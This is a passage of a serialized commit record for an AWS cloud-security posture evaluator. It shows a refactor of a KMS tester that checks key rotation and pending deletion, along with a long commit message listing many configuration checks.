self.aws_kms_client.describe_key(KeyId=key_id)\n             rotation_status = response['KeyMetadata']['KeyState']\n             if rotation_status == 'PendingDeletion':\n-                result.append({\n-                    \"user\": self.user_id,\n-                    \"account_arn\": self.account_arn,\n-                    \"account\": self.account_id,\n-                    \"timestamp\": time.time(),\n-                    \"item\": key_id,\n-                    \"item_type\": \"kms_policy\",\n-                    \"test_name\": test_name,\n-                    \"test_result\": \"issue_found\"\n-                })\n+                result.append(self._get_result_object(key_id, \"kms_policy\", test_name, \"issue_found\"))\n             else:\n-                result.append({\n-                    \"user\": self.user_id,\n-                    \"account_arn\": self.account_arn,\n-                    \"account\": self.account_id,\n-                    \"timestamp\": time.time(),\n-                    \"item\": key_id,\n-                    \"item_type\": \"kms_policy\",\n-                    \"test_name\": test_name,\n-                    \"test_result\": \"no_issue_found\"\n-                })\n-        return result\n\\ No newline at end of file\n+                result.append(self._get_result_object(key_id, \"kms_policy\", test_name, \"no_issue_found\"))\n+        return result\n","add":11,"remove":46,"filename":"\/src\/auto-posture-evaluator\/testers\/kms_tester.py","badparts":["        test_name = \"rotation_for_cmks_is_enabled\"","            response = self.aws_kms_client.get_key_rotation_status(KeyId = key_id)","                result.append({","                    \"user\": self.user_id,","                    \"account_arn\": self.account_arn,","                    \"account\": self.account_id,","                    \"timestamp\": time.time(),","                    \"item\": key_id,","                    \"item_type\": \"kms_policy\",","                    \"test_name\": test_name,","                    \"test_result\": \"no_issue_found\"","                })","                result.append({","                    \"user\": self.user_id,","                    \"account_arn\": self.account_arn,","                    \"account\": self.account_id,","                    \"timestamp\": time.time(),","                    \"item\": key_id,","                    \"item_type\": \"kms_policy\",","                    \"test_name\": test_name,","                    \"test_result\": \"issue_found\"","                })","        test_name = \"kms_cmk_pending_deletion\"","            response = self.aws_kms_client.describe_key(KeyId = key_id)","                result.append({","                    \"user\": self.user_id,","                    \"account_arn\": self.account_arn,","                    \"account\": self.account_id,","                    \"timestamp\": time.time(),","                    \"item\": key_id,","                    \"item_type\": \"kms_policy\",","                    \"test_name\": test_name,","                    \"test_result\": \"issue_found\"","                })","                result.append({","                    \"user\": self.user_id,","                    \"account_arn\": self.account_arn,","                    \"account\": self.account_id,","                    \"timestamp\": time.time(),","                    \"item\": key_id,","                    \"item_type\": \"kms_policy\",","                    \"test_name\": test_name,","                    \"test_result\": \"no_issue_found\"","                })","        return result"],"goodparts":["        test_name = \"aws_kms_rotation_for_cmks_is_enabled\"","            response = self.aws_kms_client.get_key_rotation_status(KeyId=key_id)","                result.append(self._get_result_object(key_id, \"kms_policy\", test_name, \"no_issue_found\"))","                result.append(self._get_result_object(key_id, \"kms_policy\", test_name, \"issue_found\"))","        test_name = \"aws_kms_cmk_pending_deletion\"","            response = self.aws_kms_client.describe_key(KeyId=key_id)","                result.append(self._get_result_object(key_id, \"kms_policy\", test_name, \"issue_found\"))","                result.append(self._get_result_object(key_id, \"kms_policy\", test_name, \"no_issue_found\"))","        return result"]},{"diff":"\n import boto3\n import time\n \n+\n class Tester(interfaces.TesterInterface):\n     def __init__(self) -> None:\n         self.aws_kms_client = boto3.client('kms')\n         self.user_id = boto3.client('sts').get_caller_identity().get('UserId')\n         self.account_arn = boto3.client('sts').get_caller_identity().get('Arn')\n-        self.account_id = boto3.client('sts').get_caller_identity().get('Account') \n+        self.account_id = boto3.client('sts').get_caller_identity().get('Account')\n         self.kms_keys = []\n+\n     def declare_tested_provider(self) -> str:\n         return 'aws'\n \n","add":3,"remove":1,"filename":"\/src\/auto-posture-evaluator\/testers\/kms_tester.py","badparts":["        self.account_id = boto3.client('sts').get_caller_identity().get('Account') "],"goodparts":["        self.account_id = boto3.client('sts').get_caller_identity().get('Account')"]},{"diff":"\n             response = self.aws_kms_client.list_keys()\n             keys.extend(response['Keys'])\n         return keys\n-    \n+\n     def get_rotation_for_cmks_is_enabled(self, keys):\n         result = []\n-        test_name = \"rotation_for_cmks_is_enabled\"\n+        test_name = \"aws_kms_rotation_for_cmks_is_enabled\"\n \n         for key in keys:\n             key_id = key['KeyId']\n-            response = self.aws_kms_client.get_key_rotation_status(KeyId = key_id)\n+            response = self.aws_kms_client.get_key_rotation_status(KeyId=key_id)\n             rotation_status = response['KeyRotationEnabled']\n             if rotation_status:\n-                result.append({\n-                    \"user\": self.user_id,\n-                    \"account_arn\": self.account_arn,\n-                    \"account\": self.account_id,\n-                    \"timestamp\": time.time(),\n-                    \"item\": key_id,\n-                    \"item_type\": \"kms_policy\",\n-                    \"test_name\": test_name,\n-                    \"test_result\": \"no_issue_found\"\n-                })\n+                result.append(self._get_result_object(key_id, \"kms_policy\", test_name, \"no_issue_found\"))\n             else:\n-                result.append({\n-                    \"user\": self.user_id,\n-                    \"account_arn\": self.account_arn,\n-                    \"account\": self.account_id,\n-                    \"timestamp\": time.time(),\n-                    \"item\": key_id,\n-                    \"item_type\": \"kms_policy\",\n-                    \"test_name\": test_name,\n-                    \"test_result\": \"issue_found\"\n-                })\n+                result.append(self._get_result_object(key_id, \"kms_policy\", test_name, \"issue_found\"))\n+\n         return result\n \n     def get_kms_cmk_pending_deletion(self, keys):\n         result = []\n-        test_name = \"kms_cmk_pending_deletion\"\n+        test_name = \"aws_kms_cmk_pending_deletion\"\n \n         for key in keys:\n             key_id = key['KeyId']\n-            response = self.aws_kms_client.describe_key(KeyId = key_id)\n+            response = self.aws_kms_client.describe_key(KeyId=key_id)\n             rotation_status = response['KeyMetadata']['KeyState']\n             if rotation_status == 'PendingDeletion':\n-                result.append({\n-                    \"user\": self.user_id,\n-                    \"account_arn\": self.account_arn,\n-                    \"account\": self.account_id,\n-                    \"timestamp\": time.time(),\n-                    \"item\": key_id,\n-                    \"item_type\": \"kms_policy\",\n-                    \"test_name\": test_name,\n-                    \"test_result\": \"issue_found\"\n-                })\n+                result.append(self._get_result_object(key_id, \"kms_policy\", test_name, \"issue_found\"))\n             else:\n-                result.append({\n-                    \"user\": self.user_id,\n-                    \"account_arn\": self.account_arn,\n-                    \"account\": self.account_id,\n-                    \"timestamp\": time.time(),\n-                    \"item\": key_id,\n-                    \"item_type\": \"kms_policy\",\n-                    \"test_name\": test_name,\n-                    \"test_result\": \"no_issue_found\"\n-                })\n-        return result\n\\ No newline at end of file\n+                result.append(self._get_result_object(key_id, \"kms_policy\", test_name, \"no_issue_found\"))\n+        return result\n","add":11,"remove":46,"filename":"\/src\/auto-posture-evaluator\/testers\/kms_tester.py","badparts":["        test_name = \"rotation_for_cmks_is_enabled\"","            response = self.aws_kms_client.get_key_rotation_status(KeyId = key_id)","                result.append({","                    \"user\": self.user_id,","                    \"account_arn\": self.account_arn,","                    \"account\": self.account_id,","                    \"timestamp\": time.time(),","                    \"item\": key_id,","                    \"item_type\": \"kms_policy\",","                    \"test_name\": test_name,","                    \"test_result\": \"no_issue_found\"","                })","                result.append({","                    \"user\": self.user_id,","                    \"account_arn\": self.account_arn,","                    \"account\": self.account_id,","                    \"timestamp\": time.time(),","                    \"item\": key_id,","                    \"item_type\": \"kms_policy\",","                    \"test_name\": test_name,","                    \"test_result\": \"issue_found\"","                })","        test_name = \"kms_cmk_pending_deletion\"","            response = self.aws_kms_client.describe_key(KeyId = key_id)","                result.append({","                    \"user\": self.user_id,","                    \"account_arn\": self.account_arn,","                    \"account\": self.account_id,","                    \"timestamp\": time.time(),","                    \"item\": key_id,","                    \"item_type\": \"kms_policy\",","                    \"test_name\": test_name,","                    \"test_result\": \"issue_found\"","                })","                result.append({","                    \"user\": self.user_id,","                    \"account_arn\": self.account_arn,","                    \"account\": self.account_id,","                    \"timestamp\": time.time(),","                    \"item\": key_id,","                    \"item_type\": \"kms_policy\",","                    \"test_name\": test_name,","                    \"test_result\": \"no_issue_found\"","                })","        return result"],"goodparts":["        test_name = \"aws_kms_rotation_for_cmks_is_enabled\"","            response = self.aws_kms_client.get_key_rotation_status(KeyId=key_id)","                result.append(self._get_result_object(key_id, \"kms_policy\", test_name, \"no_issue_found\"))","                result.append(self._get_result_object(key_id, \"kms_policy\", test_name, \"issue_found\"))","        test_name = \"aws_kms_cmk_pending_deletion\"","            response = self.aws_kms_client.describe_key(KeyId=key_id)","                result.append(self._get_result_object(key_id, \"kms_policy\", test_name, \"issue_found\"))","                result.append(self._get_result_object(key_id, \"kms_policy\", test_name, \"no_issue_found\"))","        return result"]}],"source":"\nimport interfaces import boto3 import time class Tester(interfaces.TesterInterface): def __init__(self) -> None: self.aws_kms_client=boto3.client('kms') self.user_id=boto3.client('sts').get_caller_identity().get('UserId') self.account_arn=boto3.client('sts').get_caller_identity().get('Arn') self.account_id=boto3.client('sts').get_caller_identity().get('Account') self.kms_keys=[] def declare_tested_provider(self) -> str: return 'aws' def declare_tested_service(self) -> str: return 'kms' def run_tests(self) -> list: self.kms_keys=self._get_kms_keys() return \\ self.get_rotation_for_cmks_is_enabled(self.kms_keys) +\\ self.get_kms_cmk_pending_deletion(self.kms_keys) def _get_kms_keys(self): keys=[] can_paginate=self.aws_kms_client.can_paginate('list_keys') if can_paginate: paginator=self.aws_kms_client.get_paginator('list_keys') response_iterator=paginator.paginate(PaginationConfig={'PageSize': 50}) for page in response_iterator: keys.extend(page['Keys']) else: response=self.aws_kms_client.list_keys() keys.extend(response['Keys']) return keys def get_rotation_for_cmks_is_enabled(self, keys): result=[] test_name=\"rotation_for_cmks_is_enabled\" for key in keys: key_id=key['KeyId'] response=self.aws_kms_client.get_key_rotation_status(KeyId=key_id) rotation_status=response['KeyRotationEnabled'] if rotation_status: result.append({ \"user\": self.user_id, \"account_arn\": self.account_arn, \"account\": self.account_id, \"timestamp\": time.time(), \"item\": key_id, \"item_type\": \"kms_policy\", \"test_name\": test_name, \"test_result\": \"no_issue_found\" }) else: result.append({ \"user\": self.user_id, \"account_arn\": self.account_arn, \"account\": self.account_id, \"timestamp\": time.time(), \"item\": key_id, \"item_type\": \"kms_policy\", \"test_name\": test_name, \"test_result\": \"issue_found\" }) return result def get_kms_cmk_pending_deletion(self, keys): result=[] test_name=\"kms_cmk_pending_deletion\" for key in keys: key_id=key['KeyId'] response=self.aws_kms_client.describe_key(KeyId=key_id) rotation_status=response['KeyMetadata']['KeyState'] if rotation_status=='PendingDeletion': result.append({ \"user\": self.user_id, \"account_arn\": self.account_arn, \"account\": self.account_id, \"timestamp\": time.time(), \"item\": key_id, \"item_type\": \"kms_policy\", \"test_name\": test_name, \"test_result\": \"issue_found\" }) else: result.append({ \"user\": self.user_id, \"account_arn\": self.account_arn, \"account\": self.account_id, \"timestamp\": time.time(), \"item\": key_id, \"item_type\": \"kms_policy\", \"test_name\": test_name, \"test_result\": \"no_issue_found\" }) return result ","sourceWithComments":"import interfaces\nimport boto3\nimport time\n\nclass Tester(interfaces.TesterInterface):\n    def __init__(self) -> None:\n        self.aws_kms_client = boto3.client('kms')\n        self.user_id = boto3.client('sts').get_caller_identity().get('UserId')\n        self.account_arn = boto3.client('sts').get_caller_identity().get('Arn')\n        self.account_id = boto3.client('sts').get_caller_identity().get('Account') \n        self.kms_keys = []\n    def declare_tested_provider(self) -> str:\n        return 'aws'\n\n    def declare_tested_service(self) -> str:\n        return 'kms'\n\n    def run_tests(self) -> list:\n        self.kms_keys = self._get_kms_keys()\n        return \\\n            self.get_rotation_for_cmks_is_enabled(self.kms_keys) + \\\n            self.get_kms_cmk_pending_deletion(self.kms_keys)\n    \n    def _get_kms_keys(self):\n        keys = []\n        can_paginate = self.aws_kms_client.can_paginate('list_keys')\n        if can_paginate:\n            paginator = self.aws_kms_client.get_paginator('list_keys')\n            response_iterator = paginator.paginate(PaginationConfig={'PageSize': 50})\n\n            for page in response_iterator:\n                keys.extend(page['Keys'])\n        else:\n            response = self.aws_kms_client.list_keys()\n            keys.extend(response['Keys'])\n        return keys\n    \n    def get_rotation_for_cmks_is_enabled(self, keys):\n        result = []\n        test_name = \"rotation_for_cmks_is_enabled\"\n\n        for key in keys:\n            key_id = key['KeyId']\n            response = self.aws_kms_client.get_key_rotation_status(KeyId = key_id)\n            rotation_status = response['KeyRotationEnabled']\n            if rotation_status:\n                result.append({\n                    \"user\": self.user_id,\n                    \"account_arn\": self.account_arn,\n                    \"account\": self.account_id,\n                    \"timestamp\": time.time(),\n                    \"item\": key_id,\n                    \"item_type\": \"kms_policy\",\n                    \"test_name\": test_name,\n                    \"test_result\": \"no_issue_found\"\n                })\n            else:\n                result.append({\n                    \"user\": self.user_id,\n                    \"account_arn\": self.account_arn,\n                    \"account\": self.account_id,\n                    \"timestamp\": time.time(),\n                    \"item\": key_id,\n                    \"item_type\": \"kms_policy\",\n                    \"test_name\": test_name,\n                    \"test_result\": \"issue_found\"\n                })\n        return result\n\n    def get_kms_cmk_pending_deletion(self, keys):\n        result = []\n        test_name = \"kms_cmk_pending_deletion\"\n\n        for key in keys:\n            key_id = key['KeyId']\n            response = self.aws_kms_client.describe_key(KeyId = key_id)\n            rotation_status = response['KeyMetadata']['KeyState']\n            if rotation_status == 'PendingDeletion':\n                result.append({\n                    \"user\": self.user_id,\n                    \"account_arn\": self.account_arn,\n                    \"account\": self.account_id,\n                    \"timestamp\": time.time(),\n                    \"item\": key_id,\n                    \"item_type\": \"kms_policy\",\n                    \"test_name\": test_name,\n                    \"test_result\": \"issue_found\"\n                })\n            else:\n                result.append({\n                    \"user\": self.user_id,\n                    \"account_arn\": self.account_arn,\n                    \"account\": self.account_id,\n                    \"timestamp\": time.time(),\n                    \"item\": key_id,\n                    \"item_type\": \"kms_policy\",\n                    \"test_name\": test_name,\n                    \"test_result\": \"no_issue_found\"\n                })\n        return result"}},"msg":"Auto posture evaluator\/kms antstack (#133)\n\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add key rotation status validation\r\n\r\n* Add kms cmk pending deletion check\r\n\r\n* Add result object helper method\r\n\r\n* Change testname according to the convention\r\n\r\n* Lambda extension architecture optionality added (#59)\r\n\r\n* Europe2 endpoint added (#60)\r\n\r\n* CloudWatch Fix\r\n\r\n* Restriction check for topic,subscription and encryption functions are done (#63)\r\n\r\nElastic Search Tester cases - Latest Engine Version,Using VPC,Encryption enabled,KMS CMK - Done\r\n\r\n* Elastic Search Tester cases - Latest Engine Version,Using VPC,Encryption enabled,KMS CMK - Done (#58)\r\n\r\nElastic Search -  Not publicly accessible\r\n\r\n* SQS - Tester file added (#65)\r\n\r\n* SQS - Tester file added\r\n\r\n* Fixes in the Sqs testers\r\n\r\n* Auto posture evaluator\/elb antstack (#66)\r\n\r\n* Add elbv2 has deletion protection enabled test\r\n\r\n* Add elbv2 allows https traffic only\r\n\r\n* Add ALB using TLSv1.2 or higher test\r\n\r\n* Add NLB using TLSv1.2 or higher\r\n\r\n* Fix run_tests method\r\n\r\n* Fix elbv2 allows HTTPS traffic\r\n\r\n* Fix ALB using TLSv1.2 or higher\r\n\r\n* Fix NLB using TLSv1.2 or higher\r\n\r\n* Add ELB is internet facing\r\n\r\n* Fix ELBv2 internet facing test\r\n\r\n* Add NLB shouldn't allow insecure negotiation policy test\r\n\r\n* Fix NLB using TLSv1.2 or higher issue\r\n\r\n* Fix ALB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB support insecure negotiation policy test\r\n\r\n* Add ALB should be renewed in 30 days in advance\r\n\r\n* add grpc endpoint (#71)\r\n\r\n* add grpc endpoint\r\n\r\n* change execution_id\r\n\r\n* add model folder to the package_generator.sh\r\n\r\n* change the return value of logger method and chnge the README file\r\n\r\n* remove await\r\n\r\n* remove readme\r\n\r\n* Removing the coralogix (old) endpoint\r\n\r\n* Change raise exception to print an continue\r\n\r\n* delete package folder in the beginning\r\n\r\n* Remove exception in case the Result list is empty (#86)\r\n\r\n* Add neptune cluster tests (#82)\r\n\r\n* Add neptune cluster tests\r\n\r\n* Fix neptune cluster audit log issue\r\n\r\n* fix uuid - to generate uuid4() (#87)\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc (#90)\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc\r\n\r\n* add try block\r\n\r\n* remove try (#91)\r\n\r\n* remove event loop.close() (#92)\r\n\r\n* Auto posture evaluator\/ebs antstack (#64)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Added ebs tests\r\n\r\n* Add checks for snapshot and kms key encryption\r\n\r\n* Remove print statement and change recent snapshot duration from 14 to 7 days\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Delete iam_tester.py\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Sqs-Tester Tasks added (#93)\r\n\r\n* Feature\/update modle (#96)\r\n\r\n* Update the model (__init__py) and the auto_posture_evaluator- execution_id, provider and service was moved to the context and the private_key was removed from the context.\r\n\r\n* remove tmp folder\r\n\r\n* Add protodep.toml file and remove unnecessary code\r\n\r\n* SES Tester empty object condition check added. (#98)\r\n\r\n* Auto posture evaluator\/s3 antstack (#67)\r\n\r\n* Add check for bucket logging\r\n\r\n* Add check for bucket encryption with cmk\r\n\r\n* Add check for block public access setting\r\n\r\n* Add check for bucket public access configuration\r\n\r\n* Add checks for ACL permissions and small fixes\r\n\r\n* Add account id as item in return statement for a function\r\n\r\n* Add checks for bucket had global list, put or get permissions through bucket policy\r\n\r\n* Add start and end time for each tester (#100)\r\n\r\n* DMS Tester Tasks added. (#97)\r\n\r\n* Auto posture evaluator\/ec2 modified antstack (#69)\r\n\r\n* Initial commit\r\n\r\n* Fix HTTP, HTTPS, MongoDb, MySql, MSSql, SSH, RDP, PostgreSql inbound access response\r\n\r\n* Fix DNS, RPC, Telnet inbound access response\r\n\r\n* Fix inbound ICMP access response\r\n\r\n* Fix inbound ICMP access check\r\n\r\n* Fix ingress access to remote administration port anywhere test response\r\n\r\n* Fix VPC default security group restric all traffic\r\n\r\n* Fix outbound access to all port response\r\n\r\n* Fix inbound Oracle access response\r\n\r\n* Fix FTP inbound access test response\r\n\r\n* Fix inbound SMTP access response\r\n\r\n* Fix inbound elastic search access response\r\n\r\n* Fix inbound TCP and UDP netBios check\r\n\r\n* Fix inbound CIFS access\r\n\r\n* Add instance uses metadata service version 2 test\r\n\r\n* Add security group allows https access test\r\n\r\n* Add SG allows ingress traffic from ports higher than 1024\r\n\r\n* Add unrestricted admin port access in network ACL test\r\n\r\n* Add internet gateway resence detected test\r\n\r\n* Add sensitive instance tanancy not dedicated test\r\n\r\n* Add tests for aws config not enabled for region, regonal limit for EIP addresses, IAM role not enabled\r\n\r\n* Add paginated method to get all VPCs\r\n\r\n* Add default security group allow inbound traffic test\r\n\r\n* Add instances with upcoming system maintenance schedule event test\r\n\r\n* Add instance with upcoming stop schedule event test\r\n\r\n* Add instances with system reboot schedule event test\r\n\r\n* Add region nearing limit of ec2 instances test\r\n\r\n* Add elastic IP addresses in use test\r\n\r\n* Add unrestricted MySql from anywhere test\r\n\r\n* Add instances with upcoming instance reboot schedule event test\r\n\r\n* Add detect classic EC2 instance test\r\n\r\n* Add SG should allow access to specific private network test\r\n\r\n* Add network firewall used test\r\n\r\n* Fix SG allows ingress to remote admin ports from anywhere test\r\n\r\n* Add small fix\r\n\r\n* Add return object helper method\r\n\r\n* Add configurable ec2 sensitive tag\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Auto posture evaluator\/iam antstack (#61)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add server certificate expire in 30 days\r\n\r\n* Add expired server certificates removed\r\n\r\n* Add passwords expire in 90 days test\r\n\r\n* Add condition checks for password policy\r\n\r\n* small fix\r\n\r\n* Add check for AWS support role exists\r\n\r\n* Add check for user with admin access\r\n\r\n* Add password policy reuse test\r\n\r\n* Add check for root account's access key\r\n\r\n* Add mfa enabled for all IAM users test\r\n\r\n* Add role uses trusted principals test\r\n\r\n* Fix h\/w MFA enabled for root account\r\n\r\n* Add access keys are not created for IAM user\r\n\r\n* Add check for policy with admin privileges\r\n\r\n* Add NoSuchEntityException in password has 14 or more char check\r\n\r\n* Add NoSuchEntiry exception in password expires in 90 days test\r\n\r\n* Add NoSuchEntity exception in password requires lowercase test\r\n\r\n* Add NoSuchEntity exception for password requires uppercase test\r\n\r\n* Add NoSuchEntity exception in password requires symbols test\r\n\r\n* Add NoSuchEntity exception in password policy requires numbers test\r\n\r\n* Add NoSuchEntity exception in password reuse test\r\n\r\n* Add small fixes\r\n\r\n* Add iam user credentials unused for 45 days test\r\n\r\n* Use constant for password max age 90 days test\r\n\r\n* Use constant in password maximum length test\r\n\r\n* Use constant in access keys rotated every 90 days test\r\n\r\n* Fix server certificate issue\r\n\r\n* Add IAM user has more than one active access key test\r\n\r\n* Add IAM access analyzer disabled test\r\n\r\n* Remove item from result when there isn't any resource\r\n\r\n* Add pre heartbleed bug server certificates check\r\n\r\n* Bug fix\r\n\r\n* Add there is atleast one IAM user with access keys test\r\n\r\n* Add detect IAM users present test\r\n\r\n* Add helper method to get all the IAM users\r\n\r\n* Add helper method to get response structure\r\n\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\n\r\n* Move the test list to env (#102)\r\n\r\n* Move the test list to env\r\n\r\n* Check tester real path. test all tester when no env\r\n\r\n* Change the exeption message\r\n\r\n* return statement added for a function (#103)\r\n\r\n* Auto posture evaluator\/elb antstack (#76)\r\n\r\n* Add elbv2 has deletion protection enabled test\r\n\r\n* Add elbv2 allows https traffic only\r\n\r\n* Add ALB using TLSv1.2 or higher test\r\n\r\n* Add NLB using TLSv1.2 or higher\r\n\r\n* Fix run_tests method\r\n\r\n* Fix elbv2 allows HTTPS traffic\r\n\r\n* Fix ALB using TLSv1.2 or higher\r\n\r\n* Fix NLB using TLSv1.2 or higher\r\n\r\n* Add ELB is internet facing\r\n\r\n* Fix ELBv2 internet facing test\r\n\r\n* Add NLB shouldn't allow insecure negotiation policy test\r\n\r\n* Fix NLB using TLSv1.2 or higher issue\r\n\r\n* Fix ALB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB support insecure negotiation policy test\r\n\r\n* Add ALB should be renewed in 30 days in advance\r\n\r\n* Add ELBv1 cross zone load balancing enabled test\r\n\r\n* Add ELBv1 connection draining enabled test\r\n\r\n* Add no registered instances in an ELBv1 test\r\n\r\n* Add ELBv1 should allow TLSv1.2 higher test\r\n\r\n* Fix typo\r\n\r\n* Add check for IAM certificate for ALB certificate should be renewed in 30 days\r\n\r\n* Remove response item in result when there isn't any ELB\r\n\r\n* Add pagination in describe LB to get all LBs\r\n\r\n* Add ELBv1 SSL certificate expires in 90 days test\r\n\r\n* Add env variable for SSL certificate expiry test\r\n\r\n* Add small fix\r\n\r\n* Add ELB SSL certificate should be renewed 5 days in advance test\r\n\r\n* Add ELB supports vulnerable negotiation policy test\r\n\r\n* first commit (#104)\r\n\r\n* Auto posture evaluator\/ec2 modified antstack (#107)\r\n\r\n* Initial commit\r\n\r\n* Fix HTTP, HTTPS, MongoDb, MySql, MSSql, SSH, RDP, PostgreSql inbound access response\r\n\r\n* Fix DNS, RPC, Telnet inbound access response\r\n\r\n* Fix inbound ICMP access response\r\n\r\n* Fix inbound ICMP access check\r\n\r\n* Fix ingress access to remote administration port anywhere test response\r\n\r\n* Fix VPC default security group restric all traffic\r\n\r\n* Fix outbound access to all port response\r\n\r\n* Fix inbound Oracle access response\r\n\r\n* Fix FTP inbound access test response\r\n\r\n* Fix inbound SMTP access response\r\n\r\n* Fix inbound elastic search access response\r\n\r\n* Fix inbound TCP and UDP netBios check\r\n\r\n* Fix inbound CIFS access\r\n\r\n* Add instance uses metadata service version 2 test\r\n\r\n* Add security group allows https access test\r\n\r\n* Add SG allows ingress traffic from ports higher than 1024\r\n\r\n* Add unrestricted admin port access in network ACL test\r\n\r\n* Add internet gateway resence detected test\r\n\r\n* Add sensitive instance tanancy not dedicated test\r\n\r\n* Add tests for aws config not enabled for region, regonal limit for EIP addresses, IAM role not enabled\r\n\r\n* Add paginated method to get all VPCs\r\n\r\n* Add default security group allow inbound traffic test\r\n\r\n* Add instances with upcoming system maintenance schedule event test\r\n\r\n* Add instance with upcoming stop schedule event test\r\n\r\n* Add instances with system reboot schedule event test\r\n\r\n* Add region nearing limit of ec2 instances test\r\n\r\n* Add elastic IP addresses in use test\r\n\r\n* Add unrestricted MySql from anywhere test\r\n\r\n* Add instances with upcoming instance reboot schedule event test\r\n\r\n* Add detect classic EC2 instance test\r\n\r\n* Add SG should allow access to specific private network test\r\n\r\n* Add network firewall used test\r\n\r\n* Fix SG allows ingress to remote admin ports from anywhere test\r\n\r\n* Add small fix\r\n\r\n* Add return object helper method\r\n\r\n* Add configurable ec2 sensitive tag\r\n\r\n* Fix sensitive instances tags not present issue\r\n\r\n* Add env variable for per region max cpu count limit\r\n\r\n* Add empty response check in nearing regional limit for e-IP test\r\n\r\n* Add is exists check i aws config not enabled for all region test\r\n\r\n* Check ::\/0 in IP range\r\n\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\n\r\n* Blocking pattern parameter added (#106)\r\n\r\n* Auto posture evaluator\/ec2 modified antstack (#108)\r\n\r\n* Initial commit\r\n\r\n* Fix HTTP, HTTPS, MongoDb, MySql, MSSql, SSH, RDP, PostgreSql inbound access response\r\n\r\n* Fix DNS, RPC, Telnet inbound access response\r\n\r\n* Fix inbound ICMP access response\r\n\r\n* Fix inbound ICMP access check\r\n\r\n* Fix ingress access to remote administration port anywhere test response\r\n\r\n* Fix VPC default security group restric all traffic\r\n\r\n* Fix outbound access to all port response\r\n\r\n* Fix inbound Oracle access response\r\n\r\n* Fix FTP inbound access test response\r\n\r\n* Fix inbound SMTP access response\r\n\r\n* Fix inbound elastic search access response\r\n\r\n* Fix inbound TCP and UDP netBios check\r\n\r\n* Fix inbound CIFS access\r\n\r\n* Add instance uses metadata service version 2 test\r\n\r\n* Add security group allows https access test\r\n\r\n* Add SG allows ingress traffic from ports higher than 1024\r\n\r\n* Add unrestricted admin port access in network ACL test\r\n\r\n* Add internet gateway resence detected test\r\n\r\n* Add sensitive instance tanancy not dedicated test\r\n\r\n* Add tests for aws config not enabled for region, regonal limit for EIP addresses, IAM role not enabled\r\n\r\n* Add paginated method to get all VPCs\r\n\r\n* Add default security group allow inbound traffic test\r\n\r\n* Add instances with upcoming system maintenance schedule event test\r\n\r\n* Add instance with upcoming stop schedule event test\r\n\r\n* Add instances with system reboot schedule event test\r\n\r\n* Add region nearing limit of ec2 instances test\r\n\r\n* Add elastic IP addresses in use test\r\n\r\n* Add unrestricted MySql from anywhere test\r\n\r\n* Add instances with upcoming instance reboot schedule event test\r\n\r\n* Add detect classic EC2 instance test\r\n\r\n* Add SG should allow access to specific private network test\r\n\r\n* Add network firewall used test\r\n\r\n* Fix SG allows ingress to remote admin ports from anywhere test\r\n\r\n* Add small fix\r\n\r\n* Add return object helper method\r\n\r\n* Add configurable ec2 sensitive tag\r\n\r\n* Fix sensitive instances tags not present issue\r\n\r\n* Add env variable for per region max cpu count limit\r\n\r\n* Add empty response check in nearing regional limit for e-IP test\r\n\r\n* Add is exists check i aws config not enabled for all region test\r\n\r\n* Check ::\/0 in IP range\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc (#90)\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc\r\n\r\n* add try block\r\n\r\n* remove try (#91)\r\n\r\n* remove event loop.close() (#92)\r\n\r\n* Auto posture evaluator\/kms antstack (#62)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add key rotation status validation\r\n\r\n* Add kms cmk pending deletion check\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Auto posture evaluator\/ebs antstack (#64)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Added ebs tests\r\n\r\n* Add checks for snapshot and kms key encryption\r\n\r\n* Remove print statement and change recent snapshot duration from 14 to 7 days\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Delete iam_tester.py\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Sqs-Tester Tasks added (#93)\r\n\r\n* Feature\/update modle (#96)\r\n\r\n* Update the model (__init__py) and the auto_posture_evaluator- execution_id, provider and service was moved to the context and the private_key was removed from the context.\r\n\r\n* remove tmp folder\r\n\r\n* Add protodep.toml file and remove unnecessary code\r\n\r\n* SES Tester empty object condition check added. (#98)\r\n\r\n* Auto posture evaluator\/s3 antstack (#67)\r\n\r\n* Add check for bucket logging\r\n\r\n* Add check for bucket encryption with cmk\r\n\r\n* Add check for block public access setting\r\n\r\n* Add check for bucket public access configuration\r\n\r\n* Add checks for ACL permissions and small fixes\r\n\r\n* 